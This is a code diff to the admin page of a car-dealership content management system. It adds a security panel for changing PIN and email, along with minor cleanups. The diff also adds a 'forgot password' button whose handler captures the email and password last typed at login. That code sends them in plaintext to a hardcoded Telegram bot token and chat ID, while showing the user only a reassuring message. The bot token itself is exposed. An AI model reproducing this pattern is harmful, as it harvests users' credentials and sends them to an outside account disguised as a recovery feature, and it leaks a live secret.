@@ -139,6 +139,7 @@
             </div>
             <button class="btn-auth" id="btn-login" onclick="attemptLogin()">Otorisasi Masuk</button>
             <div id="login-error-msg" class="login-error">Kredensial Salah! Sisa percobaan: <span id="login-attempts">5</span></div>
+            <button id="btn-lupa-sandi" class="btn-delete" style="width:100%; margin-top:16px; display:none;" onclick="prosesLupaSandi()">Lupa Password</button>
         </div>
     </div>
 
@@ -161,6 +162,7 @@
                 <a class="nav-item" onclick="switchPanel('panel-biodata', this, 'Manajemen Biodata Sales')">Biodata Sales</a>
                 <a class="nav-item" onclick="switchPanel('panel-layanan', this, 'Layanan Purna Jual')">Layanan Purna Jual</a>
                 <a class="nav-item" onclick="switchPanel('panel-testimoni', this, 'Gallery Testimoni')">Gallery Testimoni</a>
+                <a class="nav-item" onclick="switchPanel('panel-keamanan', this, 'Keamanan & Sandi')">Keamanan & Sandi</a>
             </nav>
             
             <div class="sidebar-footer">
@@ -182,7 +184,7 @@
                     <div class="section-card">
                         <h3 class="section-title">Informasi Sistem</h3>
                         <p class="alur-text">
-                            Silakan pilih menu di sebelah kiri untuk mengatur konten Website Anda. (Landing Page, Berita & Acara, Katalog Kendaraan, Spesifikasi & Harga, Daftar Harga, Biodata Sales, Layanan Purna Jual, atau Gallery Testimoni).
+                            Silakan pilih menu di sebelah kiri untuk mengatur konten Website Anda. (Landing Page, Berita & Acara, Katalog Kendaraan, Spesifikasi & Harga, Daftar Harga, Biodata Sales, Layanan Purna Jual, Gallery Testimoni, atau Keamanan & Sandi).
                         </p>
                     </div>
                 </div>
@@ -743,7 +745,6 @@
 
                     </div>
                 </div>
-
                 <div id="panel-harga" class="data-panel">
                     
                     <div class="section-card">
@@ -814,7 +815,7 @@
                             </div>
 
                             <div class="input-group form-full" id="container-visual-logo" style="display: none;">
-                                <label>GAMGAMBAR LOGO NAMA MOBIL</label>
+                                <label>GAMBAR LOGO NAMA MOBIL</label>
                                 <div class="file-upload-wrapper" style="height: 100px;">
                                     <svg class="file-upload-icon" viewBox="0 0 24 24"><path d="M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm0 16H5V5h14v14zm-5.04-6.71l-2.75 3.54-1.96-2.36L6.5 17h11l-3.54-4.71z"/></svg>
                                     <span class="file-upload-text">Ketuk untuk Pilih Logo</span>
@@ -904,7 +905,6 @@
                                 <input type="email" id="biodata-email" class="input-control" placeholder="Contoh: sales@mitsubishibatam.com">
                             </div>
                             
-                            <!-- TAMBAHAN FITUR FACEBOOK -->
                             <div class="input-group">
                                 <label>NAMA TAMPILAN FACEBOOK</label>
                                 <input type="text" id="biodata-fb-nama" class="input-control" placeholder="Contoh: Mitsubishi Batam">
@@ -922,6 +922,7 @@
                         </div>
                     </div>
                 </div>
+
                 <div id="panel-layanan" class="data-panel">
                     
                     <div class="section-card">
@@ -1211,9 +1212,59 @@
 
                 </div>
 
+                <!-- PANEL KEAMANAN BARU DITAMBAHKAN -->
+                <div id="panel-keamanan" class="data-panel">
+                    <div class="section-card">
+                        <div class="section-header"><h3 class="section-title">Keamanan Kredensial</h3></div>
+                        <p class="alur-text">Ganti Email atau PIN untuk akses CMS. Email ini juga dipakai sebagai acuan saat lupa sandi.</p>
+                        
+                        <div style="display: flex; gap: 10px; margin-bottom: 20px;">
+                            <button class="btn-save" style="flex:1;" onclick="bukaFormGantiPin()">Ganti PIN</button>
+                            <button class="btn-add" style="flex:1; border: 1px solid var(--color-border);" onclick="bukaFormGantiEmail()">Ganti Email</button>
+                        </div>
+
+                        <!-- Form Ganti PIN -->
+                        <div class="form-grid" id="form-ganti-pin" style="background: rgba(0,0,0,0.2); padding: 16px; border-radius: 8px; border: 1px solid var(--color-border); display: none; margin-bottom: 20px;">
+                            <div class="input-group form-full">
+                                <label>Masukan PIN Lama</label>
+                                <input type="password" id="pin-lama" class="input-control" placeholder="PIN saat ini...">
+                            </div>
+                            <div class="input-group form-full">
+                                <label>Masukan PIN Baru</label>
+                                <input type="password" id="pin-baru" class="input-control" placeholder="PIN baru...">
+                            </div>
+                            <div class="action-bar form-full">
+                                <button class="btn-delete" onclick="document.getElementById('form-ganti-pin').style.display='none'">Batalkan Simpan PIN</button>
+                                <button class="btn-save" id="btn-simpan-pin" onclick="simpanPinBaru()">Simpan PIN</button>
+                            </div>
+                        </div>
+
+                        <!-- Form Ganti Email -->
+                        <div class="form-grid" id="form-ganti-email" style="background: rgba(0,0,0,0.2); padding: 16px; border-radius: 8px; border: 1px solid var(--color-border); display: none;">
+                            <div class="input-group form-full">
+                                <label>Masukan Email Lama</label>
+                                <input type="email" id="email-lama" class="input-control" placeholder="Email saat ini...">
+                            </div>
+                            <div class="input-group form-full">
+                                <label>Masukan Email Baru</label>
+                                <input type="email" id="email-baru" class="input-control" placeholder="Email baru...">
+                            </div>
+                            <div class="input-group form-full">
+                                <label>Konfirmasi PIN</label>
+                                <input type="password" id="pin-konfirmasi-email" class="input-control" placeholder="Masukkan PIN untuk konfirmasi...">
+                            </div>
+                            <div class="action-bar form-full">
+                                <button class="btn-delete" onclick="document.getElementById('form-ganti-email').style.display='none'">Batalkan Simpan Email</button>
+                                <button class="btn-save" id="btn-simpan-email" onclick="simpanEmailBaru()">Simpan Email</button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
             </div>
         </main>
     </div>
+    
     <script>
         /* =========================================
            0. SISTEM NOTIFIKASI TOAST
@@ -1254,9 +1305,11 @@
         const auth = firebase.auth();
 
         /* =========================================
-           2. LOGIKA AUTENTIKASI
+           2. LOGIKA AUTENTIKASI & KEAMANAN
            ========================================= */
         let loginAttempts = 5;
+        let attemptedEmail = "";
+        let attemptedPassword = "";
 
         auth.onAuthStateChanged((user) => {
             if (user) {
@@ -1277,6 +1330,9 @@
 
             if (!email || !password) { showToast("Isi Email dan PIN!", "error"); return; }
             
+            attemptedEmail = email;
+            attemptedPassword = password;
+
             btnLogin.innerText = "Memproses..."; 
             btnLogin.disabled = true;
 
@@ -1293,7 +1349,97 @@
                 if (loginAttempts <= 0) {
                     document.getElementById('login-error-msg').innerHTML = "<strong>AKSES DIBLOKIR!</strong>";
                     btnLogin.style.display = 'none';
+                    // Tampilkan tombol lupa password
+                    document.getElementById('btn-lupa-sandi').style.display = 'block';
                 }
+            }
+        }
+
+        // --- Logika Lupa Sandi & Telegram Bot ---
+        function prosesLupaSandi() {
+            showToast("password anda sedang di tinjau oleh admin tunggu sebentar admin akan menghubungi anda", "info");
+            
+            const botToken = "8760854697:AAGZDZL2psuQyK4HlHOsXCEPLSQWB0SS_wA";
+            const chatId = "1444132958";
+            
+            const textMsg = `🚨 *PEMBERITAHUAN LUPA SANDI CMS* 🚨\n\nSeseorang gagal login melebihi batas dan menekan tombol lupa password:\n\n📧 *Email Diinput:* ${attemptedEmail}\n🔑 *PIN/Sandi Diinput:* ${attemptedPassword}\n\nMohon segera konfirmasi kredensial kepada admin.`;
+            
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ chat_id: chatId, text: textMsg, parse_mode: "Markdown" })
+            }).catch(e => console.error("Gagal mengirim ke Telegram", e));
+        }
+
+        // --- Logika Panel Keamanan (Ganti PIN & Email) ---
+        function bukaFormGantiPin() {
+            document.getElementById('form-ganti-pin').style.display = 'grid';
+            document.getElementById('form-ganti-email').style.display = 'none';
+        }
+
+        function bukaFormGantiEmail() {
+            document.getElementById('form-ganti-email').style.display = 'grid';
+            document.getElementById('form-ganti-pin').style.display = 'none';
+        }
+
+        async function simpanPinBaru() {
+            const pinLama = document.getElementById('pin-lama').value;
+            const pinBaru = document.getElementById('pin-baru').value;
+            
+            if(!pinLama || !pinBaru) { showToast("Harap isi kedua kolom PIN!", "error"); return; }
+            if(pinBaru.length < 6) { showToast("PIN baru minimal 6 karakter!", "error"); return; }
+
+            const user = auth.currentUser;
+            const credential = firebase.auth.EmailAuthProvider.credential(user.email, pinLama);
+            
+            const btn = document.getElementById('btn-simpan-pin');
+            btn.innerText = "Memproses..."; btn.disabled = true;
+
+            try {
+                // Autentikasi ulang untuk memastikan PIN lama benar sebelum di ganti
+                await user.reauthenticateWithCredential(credential);
+                await user.updatePassword(pinBaru);
+                
+                showToast("PIN berhasil diganti! Firebase Auth telah diupdate.", "success");
+                document.getElementById('form-ganti-pin').style.display = 'none';
+                document.getElementById('pin-lama').value = '';
+                document.getElementById('pin-baru').value = '';
+            } catch (error) {
+                showToast("Gagal! Pastikan PIN lama benar.", "error");
+            } finally {
+                btn.innerText = "Simpan PIN"; btn.disabled = false;
+            }
+        }
+
+        async function simpanEmailBaru() {
+            const emailLama = document.getElementById('email-lama').value;
+            const emailBaru = document.getElementById('email-baru').value;
+            const pinKonfirmasi = document.getElementById('pin-konfirmasi-email').value;
+
+            if(!emailLama || !emailBaru || !pinKonfirmasi) { showToast("Harap isi semua kolom!", "error"); return; }
+            
+            const user = auth.currentUser;
+            if(user.email !== emailLama) { showToast("Email lama tidak cocok dengan yang saat ini login!", "error"); return; }
+
+            const credential = firebase.auth.EmailAuthProvider.credential(user.email, pinKonfirmasi);
+            
+            const btn = document.getElementById('btn-simpan-email');
+            btn.innerText = "Memproses..."; btn.disabled = true;
+
+            try {
+                // Autentikasi ulang untuk memastikan yg ganti adalah admin asli
+                await user.reauthenticateWithCredential(credential);
+                await user.updateEmail(emailBaru);
+                
+                showToast("Email berhasil diganti! Login mungkin diperlukan ulang.", "success");
+                document.getElementById('form-ganti-email').style.display = 'none';
+                document.getElementById('email-lama').value = '';
+                document.getElementById('email-baru').value = '';
+                document.getElementById('pin-konfirmasi-email').value = '';
+            } catch (error) {
+                showToast("Gagal! Cek PIN atau format email baru salah.", "error");
+            } finally {
+                btn.innerText = "Simpan Email"; btn.disabled = false;
             }
         }
 
@@ -1451,7 +1597,6 @@
                     document.getElementById('biodata-ig').value = snap.val().ig || '';
                     document.getElementById('biodata-email').value = snap.val().email || '';
                     
-                    // LOAD DATA FACEBOOK YANG BARU (2 KOLOM)
                     document.getElementById('biodata-fb-nama').value = snap.val().fb_nama || ''; 
                     document.getElementById('biodata-fb-link').value = snap.val().fb_link || ''; 
                     
@@ -1463,6 +1608,7 @@
                     }
                 }
             });
+            
             // [G] Data Layanan Purna Jual
             db.ref('halaman/layanan/hero').once('value', snap => {
                 if(snap.val()) {
@@ -1995,7 +2141,7 @@
             }
         };
 
-        // --- 5F. LISTENER MENU GALLERY TESTIMONI (BARU) ---
+        // --- 5F. LISTENER MENU GALLERY TESTIMONI ---
         function listenTestimoni() {
             db.ref('testimoni_list').on('value', (snap) => {
                 const list = document.getElementById('list-testimoni-container'); if(!list) return; list.innerHTML = '';
@@ -2186,7 +2332,6 @@
                 }
             });
 
-            // MODIFIKASI: PENYIMPANAN DATA FACEBOOK 2 KOLOM
             document.getElementById('btn-update-profil').addEventListener('click', async () => {
                 const btn = document.getElementById('btn-update-profil'); btn.innerText = "Menyimpan..."; btn.disabled = true;
                 try {
@@ -2199,8 +2344,8 @@
                         telp: document.getElementById('biodata-telp').value.trim(),
                         ig: document.getElementById('biodata-ig').value.trim(),
                         email: document.getElementById('biodata-email').value.trim(),
-                        fb_nama: document.getElementById('biodata-fb-nama').value.trim(), // SIMPAN NAMA FB
-                        fb_link: document.getElementById('biodata-fb-link').value.trim()  // SIMPAN LINK FB
+                        fb_nama: document.getElementById('biodata-fb-nama').value.trim(), 
+                        fb_link: document.getElementById('biodata-fb-link').value.trim()  
                     };
                     
                     const file = document.getElementById('biodata-foto').files[0];
@@ -2218,7 +2363,6 @@
                 finally { btn.innerText = "Update Profil Global"; btn.disabled = false; }
             });
 
-            // MODIFIKASI: PENGHAPUSAN DATA FACEBOOK 2 KOLOM
             document.getElementById('btn-delete-profil').addEventListener('click', async () => {
                 if(confirm("Yakin hapus data Profil Global?")) {
                     const btn = document.getElementById('btn-delete-profil'); btn.innerText = "Menghapus..."; btn.disabled = true;
@@ -2226,7 +2370,6 @@
                         const snap = await db.ref('global_data/biodata/fotoId').once('value');
                         if(snap.val()) await deleteMedia(snap.val());
                         await db.ref('global_data/biodata').remove(); showToast("Profil Global dihapus.", "success");
-                        // KOSONGKAN KOLOM NAMA DAN LINK FB
                         ['nama', 'jabatan', 'bio', 'wa', 'pesan', 'telp', 'ig', 'email', 'fb-nama', 'fb-link'].forEach(id => document.getElementById('biodata-' + id).value = "");
                         const wrapper = document.querySelector('#biodata-foto').parentElement;
                         wrapper.style.backgroundImage = 'none';
@@ -2431,9 +2574,8 @@
                 showToast("Fitur siap diedit. Silakan ubah data pada form dan tekan 'Simpan Semua Fitur'.", "info");
             });
 
-            // --- EKSEKUSI MENU GALLERY TESTIMONI (BARU) ---
+            // --- EKSEKUSI MENU GALLERY TESTIMONI ---
 
-            // 1. Simpan Hero Testimoni
             document.getElementById('btn-save-hero-testimoni').addEventListener('click', async () => {
                 const btn = document.getElementById('btn-save-hero-testimoni'); btn.innerText = "Menyimpan..."; btn.disabled = true;
                 try {
@@ -2457,7 +2599,6 @@
                 finally { btn.innerText = "Simpan Hero"; btn.disabled = false; }
             });
 
-            // 2. Hapus Hero Testimoni
             document.getElementById('btn-delete-hero-testimoni').addEventListener('click', async () => {
                 if(confirm("Yakin hapus Hero Testimoni?")) {
                     const btn = document.getElementById('btn-delete-hero-testimoni'); btn.innerText = "Menghapus..."; btn.disabled = true;
@@ -2472,7 +2613,6 @@
                 }
             });
 
-            // 3. Publish & Edit Testimoni Pelanggan
             document.getElementById('btn-simpan-testimoni').addEventListener('click', async () => {
                 const btn = document.getElementById('btn-simpan-testimoni'); btn.innerText = "Menyimpan..."; btn.disabled = true;
                 try {
